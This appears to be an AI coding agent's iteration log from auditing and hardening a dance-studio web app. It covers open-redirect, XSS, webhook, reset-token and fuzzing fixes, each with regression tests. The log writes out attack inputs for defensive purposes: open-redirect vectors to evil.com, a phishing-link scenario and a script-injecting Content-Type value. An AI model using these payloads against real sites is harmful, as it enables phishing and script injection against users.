- **Found + fixed a real OPEN REDIRECT** on the login `?next=` param (not admin-gated — any attacker can exploit it). The check was `urlparse(next).netloc != ''`, which catches `https://evil.com` and `//evil.com` but **misses browser-normalised cross-origin forms**: `/\evil.com`, `https:evil.com`, `\/evil.com`, `////evil.com` all sailed through and redirected the just-logged-in user off-site. **The attack:** email a victim a login link `…/auth/login?next=/\evil.com`; after they log in, they land on a pixel-perfect phishing clone — a classic credential-harvest vector.
- **Fixed:** replaced the netloc check with `_is_safe_next` — rejects control chars/backslashes, resolves the target against our own host (`urljoin`), and requires the result to stay on our host and be a single-slash relative path. Verified: all 8 cross-origin vectors (+ `javascript:`) fall back to the dashboard; legitimate relative paths (`/students`, `/families/3/ledger`, `?tab=`) are honored.
- **Locked in:** `run_open_redirect_guard` — 8 malicious vectors blocked + a safe path honored. +9 checks.

### Iteration 81 — DONE (smoke 280/280, billing 21/21)
- **Scanned the attribute-injection class** specifically (`href=`/`src=`/`onclick=`/`style=` built from data — the subtler context the cashtag belonged to). 6 were safe (numbers, booleans, ids, `Date.now()`, `url_for`). Found **a second admin-gated XSS in the same payment-config family:** the **Zelle QR upload's content-type was only prefix-checked** (`startswith('image/')`), but the mimetype comes from the client's multipart Content-Type header — so a crafted upload with `Content-Type: image/png"><script>` flowed into the stored data URI and then into the parent portal's unescaped `src=`.
- **Fixed:** whitelist the content type to **exact** values (`image/png|jpeg|gif|webp`), falling back to the extension map, else 400. The data URI's type segment can now only be one of 4 clean strings — structurally incapable of carrying injection. Verified: a hostile mimetype yields `data:image/png;base64,…`, a fully-bad upload is rejected.
- **Locked in:** `run_qr_upload_safety` — hostile mimetype sanitized + non-image rejected. +2 checks. Together with iter 80's cashtag fix, **both admin-set payment-config values that render into the parent portal are now injection-proof.**

### Iteration 80 — DONE (smoke 278/278, billing 21/21)
- **Comprehensive, field-agnostic stored-XSS scan** of every template (the existing `run_xss_guard` only checks a fixed *field list*, so a user/admin-controlled field not on that list could slip through). Cleared the false positives (enums, numbers, booleans, method calls, JS builtins) and confirmed the Zelle QR is structurally safe (built from a whitelisted `image/*` content-type + base64 — can't contain `"<>`).
- **Found + fixed one real (admin-gated) XSS vector the field-list guard missed:** the Cash App **cashtag** is admin-set and flows **unescaped into an `href`/URL** on the parent portal (the *displayed* cashtag was `esc()`'d, but the URL wasn't) — so a malicious or **compromised admin** could inject script into every parent's page. Now sanitized to `[A-Za-z0-9_]` (a valid cashtag format) at the source, neutralizing it everywhere it's used. Normal cashtags preserved.
- **Locked in:** `run_cashtag_sanitize` — a hostile cashtag is stripped, a valid one survives. +2 checks.

### Iteration 79 — DONE (smoke 276/276, billing 21/21)
- **Audited the boot auto-migration logic** — it runs on **every** app start, and Fly wakes/sleeps the machine several times a day, so a non-idempotent migration would boot once then crash on the next wake. **No bug — it's correctly idempotent:** `_add_missing_columns` checks `inspector.get_columns` and only `ALTER TABLE ADD COLUMN` for columns that don't exist yet, then commits. Verified by re-running it repeatedly + booting a second app instance on the already-migrated DB — all clean. (Not wrapping it in try/except is right, too: a genuine schema failure *should* fail loud rather than silently run on a half-migrated DB — unlike the optional recurring-charge/reminder handlers, which are wrapped.)
- **Locked in:** `run_migration_idempotency` — re-runs the boot migrations and asserts no error, guarding the Fly-wake invariant.

### Iteration 78 — DONE (smoke 275/275, billing 21/21)
- **Verified delete-integrity across every hard-delete parent** (a 200 delete can still *orphan* children even when it doesn't 500). All clean: `delete_recital` **cascades** (`cascade='all, delete-orphan'`) — deleting a recital removes its numbers, cast, awards, and ads with **0 orphans left**; `delete_audition` and `delete_ticket_type` explicitly clean up their children; `delete_group`/`delete_costume` are soft-deletes (row stays); and `delete_performance` was fixed last iteration. No bug.
- **Locked in:** `run_recital_delete_cascade` — deletes a recital with numbers/cast/awards/ads and asserts 200 + **zero orphaned children**, so a future change that drops the cascade config is caught.

### Iteration 77 — DONE (smoke 274/274, billing 21/21)
- **Systematic DELETE fuzz — the fourth HTTP verb** (create/update/read were already fuzzed). Seeded a real entity (with children) for each of the 31 DELETE endpoints and deleted it, checking for a 5xx. **Found 1 real bug:** `DELETE /api/performance/performances/<id>` **500'd with an IntegrityError** — it cleaned up `PerformanceAssignment`s but NOT the performance's **TicketTypes/TicketOrders**, whose `performance_id` FK is NOT NULL. So SQLAlchemy tried to null the FK on delete and hit the constraint: **a performance that had ticket sales set up couldn't be deleted at all.**
- **Fixed:** `delete_performance` now deletes the ticket orders → ticket types → assignments before the performance. Re-fuzzed all 31 DELETE endpoints → **0 five-hundreds.**
- **Locked in:** a regression check in `run_recital_money` — delete a performance that has ticket types + orders → 200. **All four HTTP verbs are now fuzzed** (create bodies, update bodies, read query params, deletes).

### Iteration 76 — DONE (smoke 273/273, billing 21/21)
- **Fuzzed the UPDATE surface — the blind spot in the robustness coverage.** The iter-74 mutation fuzz substituted *bogus ids* for PUT/PATCH params, so those hit `get_or_404` (404) before their update logic ever ran. Seeded valid entities and fuzzed all 18 PUT/PATCH endpoints with garbage bodies → **found 4 that 500'd** (`update_location`, `update_costume`, `update_recital_number`, `update_recital_ad`) plus, on a deeper pass, **19 more `(data['x'] or '').strip()` sites** (a bracket form my earlier regex missed) and **`apply_student_fields`** (`val.strip()` in a loop).
- **Fixed comprehensively:** routed all of them through `_clean_str` / `_opt_int` / safe float coercion. Two deeper bugs in `apply_student_fields`: it **blanked the NOT NULL `first_name`/`last_name`** on empty input (IntegrityError 500) — now those are only updated to a non-empty value; and an unguarded `strptime(date_of_birth)` — now guarded. Happy path confirmed (a valid update sets the name and preserves the rest).
- **Locked in:** `run_update_fuzz` — seeds an entity for every update endpoint and asserts a garbage body never 5xxs. **Input robustness now covers the whole API in all three directions:** create bodies (82), update bodies (18), and read query params (74).

### Iteration 75 — DONE (smoke 272/272, billing 21/21)
- **Fuzzed the READ surface with malformed query params** (companion to iter 74's mutation-body fuzz). Every `/api` GET × a battery of bad query strings — `?year=abc`, `?page=xyz`, `?per_page=-1`, `?start=notadate`, `?status=%00`, huge values — **74 endpoints, 0 five-hundreds.** No bug: the reports (bad year → current year), CSV exports (bad dates ignored), and paginated lists all degrade gracefully.
- **Locked in:** `run_get_queryparam_fuzz` — asserts no GET endpoint 5xxs on malformed query params. Together with `run_full_mutation_fuzz`, the **input-robustness guarantee now covers the entire API in both directions** (write bodies + read query params), guarded against regression.

### Iteration 74 — DONE (smoke 271/271, billing 21/21)
- **Comprehensive malformed-input fuzz of ALL ~84 mutation endpoints** (the earlier robustness sweep only individually hit ~21). Found **4 more create endpoints that 500'd** on a non-string `title`/`name` — `create_audition`, `create_performance`, `create_costume`, `create_recital` — the same `data['x'].strip()`-on-an-int class fixed for other endpoints back in iter 43, but these four (plus every *update* function, latent behind `get_or_404`) were never covered.
- **Closed the whole class at once:** globally replaced **72** fragile `data['x'].strip()` / `(data.get('x') or '').strip()` sites across `routes.py` with the `_clean_str` helper (coerces any JSON scalar to a trimmed string). Re-fuzzed with an expanded garbage payload → **0 five-hundreds across all 84 endpoints.** Full suite still green (72-site change, no regressions).
- **Locked in:** `run_full_mutation_fuzz` — fuzzes every `/api` POST/PUT/PATCH endpoint with malformed payloads and asserts none 5xx. This is the *systematic* backstop: it catches any endpoint — present or future — that would 500 on bad input, not just the ones with a hand-written test. +1 aggregate check (82 endpoints).

### Iteration 73 — DONE (smoke 270/270, billing 21/21)
- **Audited the last untested money flows — recital costume fees + ticket sales.** **No bug, both correct:**
  - **Costume charge is idempotent:** it charges only assignments `filter_by(charged=False)` and marks each charged, so a double-click charges every dancer once and the second call charges 0 (verified: #1→2, #2→0). Fee validated > 0 at charge time (so even a stored negative fee can't post).
  - **Ticket-order totals are right:** amount = qty × price; the sales summary correctly reports total tickets and splits **paid revenue** from **pending** (verified: 3 paid + 2 unpaid → 5 tickets, $37.50 revenue, $25.00 pending).
- **Locked in:** `run_recital_money` — costume-charge idempotency + ticket total/paid/pending math. +2 checks. This was the last money-adjacent surface; every flow that touches a dollar is now audited.

### Iteration 72 — DONE (smoke 268/268, billing 21/21)
- **Deep audit of the Square card-payment webhook** (real money when the studio enables it for fall). The core was correct — constant-time HMAC verification, records the right amount (`amount_cents/100` = the net balance after the earlier overcharge fix), idempotent (`paid_at` guard, no double-record), and `PARTIALLY_PAID` correctly ignored. **One security posture fix:** it **failed OPEN** — when no signature key was configured it processed the webhook *unverified*, so an attacker who learned a real invoice id could forge a `PAID` event and credit an account. Changed to **fail closed**: no key → the event is ignored (not recorded), returns 200 so Square doesn't retry.
- **Verified end-to-end:** no key → nothing recorded; valid signature + `PAID` → records the exact amount, balance drops; **bad signature → 403**; replay → `already_recorded` (no double); `PARTIALLY_PAID` → ignored.
- **Locked in:** rewrote `run_square_webhook` to sign events properly and cover fail-closed + bad-signature + the verified flow. Documented the signature-key requirement in [GO-LIVE.md](GO-LIVE.md). +2 checks.

### Iteration 71 — DONE (CI/deploy verification; smoke 266/266, billing 21/21)
- **Audited the ops/CI/deploy config** — the 287 tests only matter if CI actually runs them, and go-live only works if prod boots. **All sound, no bug:**
  - **CI** (`.github/workflows/tests.yml`): triggers on push-to-`main` + every PR, installs the *prod* dependency set (`requirements-deploy.txt`), runs **both** harnesses, and fails the build on non-zero exit. The tests genuinely gate.
  - **Deps:** cross-checked every third-party import in `app/` against `requirements-deploy.txt` — all covered (directly or transitively). Pillow is correctly **excluded** (build-time icon tool only — images are stored as base64 data URIs, no runtime PIL); the `rfid` package is local + import-guarded (`try/except ImportError`); Twilio uses REST via `requests` (no SDK dep). **Prod will boot.**
  - **Dockerfile:** single gthread worker (fits 256MB — 2 workers OOM'd), `TZ=America/New_York`, `COPY . .` includes `rfid/`, correct gunicorn CMD. **`.dockerignore`** excludes venv/.git/cache/**data** (lean image, no dev DB leak).
  - **fly.toml:** auto-sleep, `/data` volume mounted, `SECRET_KEY` intentionally NOT committed (must be `fly secrets set`).

### Iteration 70 — DONE (smoke 266/266, billing 21/21)
- **Closed the last identified security gap: login brute-force.** There was **no rate limiting** on `/auth/login` — an attacker could hammer it guessing passwords (more feasible now that passwords can be as short as 6 chars). Added a conservative in-memory throttle: **per-username** (not per-IP — studio families share the studio's IP, so an IP lockout would lock them all out; a per-account lockout targets the account under attack), **8 failures / 15-min window → 5-min cooldown**, and it **clears on a successful login**. So automated guessing is throttled to a useless rate while a legit user who fumbles their password a few times is unaffected.
- **Verified:** 8 wrong attempts allowed → 9th returns 429; even a *correct* password is blocked while locked out; a **different account is unaffected** (per-account isolation, no DoS of the whole studio); a real login resets the counter. Doesn't interfere with the test suite's many logins.
- **Note:** the throttle is process-local (resets on a Fly restart) and single-worker — a solid app-level baseline; edge rate-limiting (Cloudflare/Fly proxy) could layer on top later if desired.
- **Locked in:** `run_login_throttle` — throttle-after-N, correct-pw-still-blocked, per-account isolation, clear-on-success. +4 checks.

### Iteration 69 — DONE (smoke 262/262, billing 21/21)
- **Adversarial audit for privilege escalation / mass-assignment.** **No escalation path exists** (verified): update endpoints whitelist fields (`apply_student_fields` applies a known field list, not arbitrary `setattr`); `update_staff` is admin-only AND refuses non-staff users (so an admin can't convert a *parent* account to admin through it); there is **no self-service profile-update endpoint** (only change-password), so a user can't inject `role`/`is_admin` on themselves; role changes are admin-gated + validated to `('admin','teacher')`. A teacher gets 403 from both create/update-staff.
- **Found + fixed one minor data-integrity gap:** `update_student`'s `family_id` did `int(data['family_id'])` unvalidated — a garbage value 500'd and a nonexistent family id **orphaned** the student (`family_id` pointing nowhere). Now coerces safely and only re-assigns to a family that exists (else leaves it unchanged) — no 500, no orphan.
- **Locked in:** `run_privilege_escalation` — teacher blocked from staff management (P0), admin can't promote a parent to admin (P0), student-update field whitelist / no-orphan family_id. +3 checks.

### Iteration 68 — DONE (smoke 259/259, billing 21/21)
- **Adversarial audit of the password-reset token** (a reset link is a bearer credential). The flow was mostly solid — generic response (no email enumeration), 1-hour expiry, active-user check, 6-char minimum. **But the token was replayable:** it encoded only `user.id`, and `itsdangerous` tokens are stateless, so a used/intercepted reset link **still worked within its 1-hour window and survived the password change** — an intercepted link could re-take the account.
- **Fixed → single-use:** the token now embeds a slice of the current password hash; on use it's verified against the live hash, so the moment the password changes the token no longer matches and any replay is rejected. Verified: first use resets, a replay of the same token does NOT take effect (attacker's password rejected), tampered/expired tokens rejected.
- **Locked in:** added a **P0 single-use replay check** to `run_password_reset` (a used link must not reset again) + updated the token format. +1 net check.

### Iteration 67 — DONE (smoke 258/258, billing 21/21)
- **Adversarial security audit of the parent invite-code system** (account-claim credential → account-takeover vector if weak). **Verified secure:** codes are 8-char CSPRNG hex (`secrets.token_hex`, not `random`), `unique`, **single-use** (cleared to None on claim — a spent code creates no account, no takeover), and `register_parent` has **no privilege escalation** (it only mutates the pre-existing `parent` invite user; never reads `role`/`is_admin`).
- **Found + fixed one real gap:** `change_password` and `reset_password` both enforce a 6-char password minimum, but **`register_parent` — the main onboarding flow where most parents set their password — enforced none** (a 1-char password was accepted). Added the matching 6-char minimum. (The fix immediately caught a test that had used a 2-char password — updated it.)
- **Locked in:** `run_invite_security` — CSPRNG format, password-minimum enforced, single-use, and no-account-on-reuse (P0). +4 checks.

### Iteration 66 — DONE (smoke 254/254, billing 21/21)
- **Audited skills + certificate** (last untested student-facing feature). No bug: the skill toggle is clean (on→True/off→False, no duplicate rows — backed by a real `UniqueConstraint`), `get_or_404`s both the student and skill (404 on bad ids), is admin-only, and the certificate renders for a student with a skill. Locked in with `run_skills`. +4 checks.
- **Refreshed the top-of-file verdict** (it had gone stale over ~24 iterations) into a current, crisp summary + an explicit **"What remains"** section: 2 ops steps + 2 decisions (teacher billing, auto-pay) + optional config — nothing code-side blocks launch.
- (Also answered a live question from Thomas on native vs PWA — recommendation: stay web/PWA; use SMS/email for notifications; wrap in Capacitor only if App-Store presence ever becomes a goal.)

### Iteration 65 — DONE (smoke 250/250, billing 21/21)
- **Audited the message/email blast** (fall comms tool). **Recipient resolution is correct:** a class blast targets only that class's families and **dedupes** (a parent with two kids in the same class gets ONE email, and other families are excluded — verified); individual targets one family; bad class/student ids return 400 (not 500). Uses a `set` so no one is emailed twice.
- **Found + fixed one robustness bug:** `send_message` did `data['subject'].strip()`, so a non-string subject 500'd. Now coerces subject/body/recipient_type via `_clean_str` and re-validates (empty → 400). 
- **Locked in:** extended `run_message_blast` with class-targeting/dedup correctness (only the enrolled family, not others) + non-string-subject robustness. +3 checks. (250 is a round milestone.)

### Iteration 64 — DONE (smoke 248/248, billing 21/21)
- **Audited the retention / analytics dashboard** (the studio makes enrollment/retention decisions on it, so the math has to be right). **No bug — verified correct with known data:** active/inactive counts, `new_this_month` (drives off `enrollment_date`, which has a `default=date.today, NOT NULL` so every student always gets a creation date — no silent-zero), the 12-month enrollment chart + 6-month attendance chart, and the **at-risk logic** (an active student with no attendance in 30 days is flagged; one who attended is not — confirmed both directions). Admin-only, parent + teacher blocked.
- **Locked in:** `run_analytics` — response shape (12 enroll-months, 6 attendance-months, at_risk list), the count/list consistency, and admin-only. +3 checks.

### Iteration 63 — DONE (smoke 245/245, billing 21/21)
- **Audited the leads pipeline** (active in enrollment season — prospects/trials → convert to enrolled student). Found + fixed:
  - **`convert_lead` was not idempotent** → a double-click on "Convert" (or converting an already-converted lead) created a **second duplicate Family + Student** every time. The registration-approve flow guards this; convert didn't. Now returns 400 if `status == 'converted'` (verified: convert #1→200, #2→400, exactly one family+student created).
  - **`update_lead` did `.strip()` on raw input** → a non-string `name` 500'd, and an empty/whitespace name would null the `NOT NULL` name column (IntegrityError 500). Now coerces via `_clean_str` and rejects an empty name with 400.
- **Locked in:** `run_leads` — convert idempotency (no duplicate family/student on double-click), update robustness, and parent-blocked. +4 checks.

### Iteration 62 — DONE (smoke 241/241, billing 21/21)
- **Audited the staff time clock** (payroll). The hours math is correct (`(clock_out - clock_in)` in hours; both UTC so timezone-independent) and the guards work (no double clock-in, can't clock out without clocking in, report is admin-only). But found a **real, systemic timezone DISPLAY bug.**
- **The bug:** the API emits datetimes via `.isoformat()` on `datetime.utcnow()` values — a **naive** string with no zone (`2026-07-05T21:00:00`). The browser's `new Date()` reads a naive datetime string as **local**, so every UTC time renders **shifted by the whole UTC offset** — a 5pm clock-in shown as 9pm, attendance check-in times and payment timestamps all ~4-5h wrong for the Eastern-time studio.
- **The fix:** a `_utc_iso()` helper that appends `Z` so the browser converts to local correctly. Swept **20 datetime serializer fields** (clock in/out, attendance check-in, pending-payment/transaction/message/audit `created_at`, `reviewed_at`, `signed_at`, `last_login`, etc.) — carefully **excluding DATE fields** (`transaction_date`, `donation_date`, …) which must stay bare (verified: `created_at`→`…Z`, `transaction_date`→`2026-07-05`). Also guarded the payroll report's inline `e.user.full_name`.
- **Locked in:** `run_timeclock` — clock guards, hours-sum in the report, UTC-marked timestamps, parent-blocked. +7 checks.

### Iteration 61 — DONE (browser verification; smoke 234/234, billing 21/21)
- **Browser-verified the parent portal end-to-end** — the fall-critical UX surface, and the one place HTTP tests are blind (a runtime JS error renders 200 but a dead page; that's exactly how the original fatal portal bug shipped). Motivation: 66 commits changed many of the API responses the portal JS consumes (validation, orphan guards, serializers now returning guarded values like '(removed student)') — a shape regression could silently break it.
- **Result: portal works, no regression.** Logged in as the demo parent in a real browser: the child card renders (balance, 'Paid up', attendance), and every **lazy-loaded JS section fires** — the Makeups section populated with real data ('Aaliyah Johnson · missed 2026-06-18 · requested'), Payments/history loaded, the recital card rendered. **Zero console errors, zero 'failed to load' text**, and the handler functions (`openPay`, `requestMakeup`) are defined and callable. The API changes across 60 iterations didn't break the response shapes the portal depends on.
- (No code change — a verification pass. The portal can't be regression-guarded in the HTTP smoke suite since runtime JS errors need a real browser; `run_js_syntax` still catches syntax-level breaks.)

### Iteration 60 — DONE (smoke 234/234, billing 21/21)
- **Audited the teacher-vs-admin authz boundary** — I'd tested *parents* exhaustively but never the middle role (teacher = staff, not admin). Found a real **data leak: `GET /api/reports/revenue` and `/api/reports/aging` used `_staff_only()`, so a teacher could pull the studio's whole revenue report and every family's debt** via the URL/API — even though the nav gates those links behind `is_admin`. A hidden link is not access control. Changed both to `_admin_only()` (verified: teacher→403, admin→200). Everything else a teacher must not touch (settings, staff, audit-log, backup, analytics, donations, registrations, pending-confirm, delete-transaction, late-fees) was already correctly admin-gated.
- **⚠️ FLAGGED FOR THOMAS — a policy decision, not fixed:** `create_transaction`, `bulk_charge`, and `create_recurring_charge` have **no admin gate**, so a **teacher can post charges/payments, bulk-charge every family in a class, and set up recurring auto-billing.** BUT the nav intentionally shows teachers the Payments page with those buttons un-gated — so this may be *intended* (front-desk payment entry). It's a studio workflow call: if teachers shouldn't handle billing (typical when the owner does the money), the whole billing area (page + buttons + these 3 APIs) should go admin-only. I did NOT change it unilaterally — it changes who can do billing. **Decide and tell me.**
- **Locked in:** `run_teacher_authz` — teachers CAN see rosters (classes/students) but are blocked (403) from 9 admin-only financial/config/staff surfaces. +11 checks.

### Iteration 59 — DONE (smoke 223/223, billing 21/21)
- **Audited waivers / digital consent forms** (Jackrabbit parity + a legal/liability dimension — accurate consent tracking matters). **The consent logic is correct:** a mandatory waiver can't be declined (400), an opt-out form (photo release) records a decline as `consent=False` and shows it separately in the compliance view, an empty signature is rejected, and there's a real DB unique constraint (one signature per student per template — no duplicates). Object-level authz is enforced (parent signs only their own child).
- **Found + fixed one orphan-deref:** `waiver_compliance` built the declined list with `Student.query.get(sid).full_name` **inline** — so the iter-53 serializer sweep didn't catch it, and a signature whose student was removed 500'd the staff compliance page. Now guarded (renders '(removed student)' instead). This was the last inline student-deref outside the serializers.
- **Locked in:** extended `run_waiver_signing` with compliance-count checks + an orphan-signature render check. +2 checks.

### Iteration 58 — DONE (smoke 221/221, billing 21/21)
- **Checked late fees** (`apply-late-fees`): well-guarded already — try/except on the amount (garbage→400), rejects non-positive, and idempotent (skips students already charged a late fee this month). No bug.
- **Audited the printable financial/tax documents** (student + family statements, the 501(c)(3) giving statement, certificate, recital booklet) — Jinja-rendered pages (a different path than the JSON APIs) and NOT in the no-arg render sweep. **No bug — all correct and robust:** every one renders 200 on edge data (student with no transactions, empty family, no skills, empty recital), a nonexistent id 404s (not 500), and the **math is right** — statement balances match the ledger, and critically the **giving statement filters donations to the requested year** (a prior-year donation is excluded), which is tax-essential.
- **Locked in:** `run_statements` — edge-data renders, 404s, and the tax-critical giving-statement year filter. +8 checks. (Also caught + fixed a self-inflicted edit that had dropped the `run_xss_guard` def; both restored and green.)

### Iteration 57 — DONE (smoke 213/213, billing 21/21)
- **Audited the auto-reminder engine** — the recurring-charge engine's sibling: it emails/texts families with balances, and runs on **every boot + cron** (machine wakes/sleeps all day). The once-per-month gate works (`Setting.set` commits, so `reminders_last_run` persists). But two robustness gaps could cause **reminder SPAM** — the worst kind of bug for a studio's reputation:
  - **`send_sms` was NOT wrapped in try/except** (email was — an asymmetry). One SMS failure mid-loop aborted the whole run *before* the month was marked done, so the next boot (same day) re-ran and **re-emailed already-notified families**. Wrapped it.
  - **The month was marked done only at the END of the send loop.** A mid-loop kill (OOM on the 256MB box, plausible during a big batch) meant a re-run re-sent. Moved the marker to **before** the loop (mark-first) — reminders are a best-effort monthly nudge, so at-most-once beats guaranteed-delivery (the studio still sees balances on the aging report).
- **Cron endpoint:** auth is solid (constant-time `compare_digest`, unset token always rejects). Wrapped its two handlers so one failing doesn't block the other (parity with the boot path).
- **Locked in:** `run_auto_reminders` — disabled=no-op, enabled marks-month-done (mark-first), repeat-in-month=gated no-op. +3 checks.

### Iteration 56 — DONE (smoke 210/210, billing 21/21)
- **Audited the recurring-charge auto-biller** — the scariest untested money code: it runs on **every app boot** (Fly wakes/sleeps several times a day) and charges families automatically. The scheduling logic itself is correct (gates on `today.day < due_day` so it never bills early, clamps short months, dedups by month, charges only enrolled students). But found real bugs on the create side and a boot-safety gap:
  - **`create_recurring_charge` stored `amount` UNVALIDATED** — a **negative** amount was accepted (201) and would post a **silent credit every single month**; a non-numeric amount 500'd; an absurd amount was accepted. Unlike one-off charges, it skipped `_valid_amount` entirely. Now validated the same way (negative/non-numeric/absurd → 400), plus `day_of_month` garbage no longer 500s.
  - **The startup call `_process_recurring_charges()` was NOT wrapped in try/except** (only auto-reminders was), so a single bad row could **brick app boot** — every request 500s until the row is removed. Wrapped it (rollback + log + continue) and guarded the `rc.dance_class.name` deref inside the engine.
- **Locked in:** smoke — recurring amount/day validation (5 checks); billing — a **day-gating** test proving a future-dated charge does NOT fire before its due day (the idempotency test only used day 1 = always past). +6 checks.

### Iteration 55 — DONE (smoke 205/205, billing 20/20)
- **Audited payment plans + installments** (a Jackrabbit-parity billing feature, and families are setting up fall plans now). **No bug — the feature is correct and robust:** installment generation produces the right count on a clean monthly schedule (`_add_months` clamps day-of-month correctly), amounts are right by construction (amount × count, no total to reconcile), inputs are validated (garbage→400, day>28→400, nonexistent student→404), and it's admin-only with parent IDOR blocked (create + view).
- **Design note the studio should know (NOT a defect):** a payment plan is a **schedule, not a charge**. Toggling an installment "paid" flips a tracking flag — it does **not** post a payment to the ledger, and creating a plan does not post charges. So the plan's paid-status and the student's actual balance track independently; the real payment must be recorded separately (claim/confirm or a manual payment). This is a reasonable design (avoids double-counting) but worth telling the studio so they don't expect the balance to move when they tick off an installment. Left as-is — changing it is a workflow decision, not a bug fix.
- **Locked in:** `run_payment_plans` — schedule math (6×$100 on the 15th, strictly increasing dates), validation, toggle, and parent-blocked. +5 checks.

### Iteration 54 — DONE (smoke 200/200, billing 20/20)
- **Audited the public self-registration endpoint** (`POST /api/register`) — the ONE unauthenticated write endpoint besides login, so the primary external attack surface, and live the moment fall enrollment opens. Found **5 unauthenticated 500s:** a non-list `students`, a non-dict list element, `students` as a dict, `students=[int]`, or a non-string `parent_name` all crashed it (`.get`/`.strip` on the wrong type). Also no cap on dancer count (a scripted submit could stuff thousands of rows into one row).
- **Hardened it:** coerce every field via `_clean_str`, validate `students` is a list and each element a dict, **store only cleaned known fields** (first/last/dob/allergies) rather than the raw dicts — so a non-string `last_name` can't later 500 the admin *approve* flow — and cap at 30 dancers. Every malformed payload now returns 400, not 500.
- **Verified the stored-XSS path is safe end-to-end:** an attacker's `<script>` in a name is stored raw (correct — escape at output) and the admin registrations + students lists both render it escaped via `esc()`. Approve of a fully-malformed/XSS registration returns 200 and the lists render.
- **Locked in:** extended `run_registration_flow` with 8 checks (malformed→400, count cap, XSS-approve-renders). +8 checks.

### Iteration 53 — DONE (smoke 192/192, billing 20/20)
- **Root-caused the whole dead-page bug class at the serializer layer.** The create-side fixes (iters 43–52) stop *new* orphans, but I realized any orphan row **already in the prod DB** from the weeks those bugs existed would *still* dead-page its list — because the roster serializers deref `x.student.full_name` unguarded. Confirmed: injecting one orphan makeup row still 500'd `GET /api/makeups`.
- **Swept every serializer relationship deref** (grepped `.student`/`.family`/`.dance_class`/etc.). Verified the nullable-FK ones (`_award_to_dict`, `_ad_to_dict`, ticket orders) were already guarded and the non-null ones are backed by soft-deletes — then **null-guarded the 14 that weren't** (`'student_name': x.student.full_name` → `… if x.student else None`, same for `class_name`). Now makeups, waitlist, group members, attendance, transactions all render 200 even with orphan data present.
- **Locked in:** `run_orphan_render_guard` injects orphan rows directly (bypassing the fixed endpoints, simulating existing prod damage) and asserts 5 roster lists still render (200). +5 checks. This closes the dead-page class from BOTH sides — prevention (create validation) and resilience (defensive serializers).
- **Note for go-live:** the prod DB *may* contain orphan rows from the pre-fix period; they're now harmless (lists render, orphans just show a null name), but a one-time cleanup could delete them. Low priority — not a blocker.

### Iteration 52 — DONE (smoke 187/187, billing 20/20)
- **Extended the orphan-row sweep to NON-student foreign keys** (`instructor_id`, `location_id`, `class_id`, `group_id`). Found a **high-value one on a core page:** `class_to_dict` dereferenced `dance_class.instructor.full_name` **unguarded** (while it *did* guard `location`), so a class created with a bad `instructor_id` — or whose instructor is later removed — made `GET /api/classes`, the **core high-traffic class list**, **500 permanently**. `create_class` also 500'd on a garbage `instructor_id`/`location_id`.
  - Fixed the serializer (`instructor.full_name if instructor else None`) — the dead-page fix, protects against any missing instructor — and hardened `create_class` to validate the instructor + location refs (400 garbage / 404 nonexistent).
- **Swept the remaining optional FK sites:** audition/performance `group_id`, costume + recital-number `class_id`/`group_id` all did `int(data['x'])` → 500 on garbage (their renders are already null-guarded, so no dead-page). Routed through a new `_opt_int` helper (garbage → None). Every create endpoint now avoids a 5xx on a bad FK.
- **Locked in:** `run_class_render_guard` — create_class rejects bad instructor/location (400/404) and the class list still renders with a missing-instructor class (the serializer guard). +4 checks.

### Iteration 51 — DONE (smoke 183/183, billing 20/20)
- **Systematic sweep of the recurring orphan-row bug** (promised last iteration after hitting it 3× one-at-a-time). Grepped every create endpoint that stores a request-supplied `student_id`, then probed each with a nonexistent + garbage id. **Found 6 more instances**, all the same shape — no existence check → orphan row → roster page 500s on `.student.full_name`:
  - `add_group_member` (company roster), `assign_to_performance`, `assign_costume`, `add_recital_cast` (single + `student_ids` list), `create_recital_award`, `create_recital_ad`. All also 500'd on a non-numeric id (`int('xyz')`).
  - Fixed all 6 with a new `_resolve_student_id(raw, required=)` helper (positive-int + existence, 404/400). Each now rejects nonexistent (404) and garbage (400), creates zero orphans, and its roster renders (200).
- **Locked in:** `run_orphan_guard` — a systematic 6-endpoint sweep (nonexistent->404, garbage->400, roster->200) that will catch any *new* endpoint that reintroduces the pattern. +6 checks. Combined with the makeup/attendance/waitlist fixes, the entire student-reference create surface is now orphan-safe.

### Iteration 50 — DONE (smoke 177/177, billing 20/20)
- **Audited enrollment + waitlist — live right now ("summer session has begun").** Enrollment dedups correctly (repeat enroll → skipped, reactivates a dropped one). Found + fixed the same orphan-row class of bug that keeps recurring:
  - **`add_to_waitlist` didn't validate the student exists** → a bad/stale id created an **orphan `WaitlistEntry`**, which made `GET /api/classes/<id>/waitlist` **500 permanently** (`w.student.full_name` on a null student) — the class's waitlist page dead until DB surgery. Now `get_or_404`s the student (404) and `_valid_id`s the input (400).
  - **`enroll_student` 500'd on a non-numeric `student_id`** (`int('xyz')`), both the single id and list-element paths. Now coerces via `_valid_id` and skips un-parseable ids instead of blowing up the whole batch.
- **Verified working:** promote-from-waitlist enrolls the student (idempotent — won't double-enroll); enroll skips nonexistent students silently (no orphan).
- **Locked in:** extended `run_enrollment` with garbage-id, orphan-waitlist, waitlist-page-renders, and promote checks. +6 checks.

### Iteration 49 — DONE (smoke 171/171, billing 20/20)
- **Audited attendance — the app's namesake + most-used daily feature.** Both entry points dedup correctly for normal use (manual check-in returns 400 if already present; toggle deletes-or-creates), so no duplicate rows in practice. Found + fixed two real edge issues:
  - **Misleading model comment (correctness-adjacent):** `Attendance.__table_args__` was commented "Unique constraint to prevent duplicate check-ins" but it's a **plain, non-unique index** (and mis-defined — `db.func.date('check_in_time')` operates on the string literal, not the column). Dedup is entirely application-level. Corrected the comment to say so, so no one trusts a DB guarantee that isn't there.
  - **`toggle_attendance` didn't validate the student/class exist** (unlike `manual_checkin`), so a bad id created an **orphan attendance row**, and a malformed `date` **500'd**. Now validates ids via `_valid_id`, `get_or_404`s the student + class, and parses the date safely (falls back to today).
- **Locked in:** rewrote `run_attendance` — the old test had been toggling against a *non-existent* class (`class_id: 4321`), literally relying on the orphan-row bug; now it seeds a real class and adds dedup + existence + bad-date + parent-blocked checks. +2 checks.

### Iteration 48 — DONE (smoke 169/169, billing 20/20)
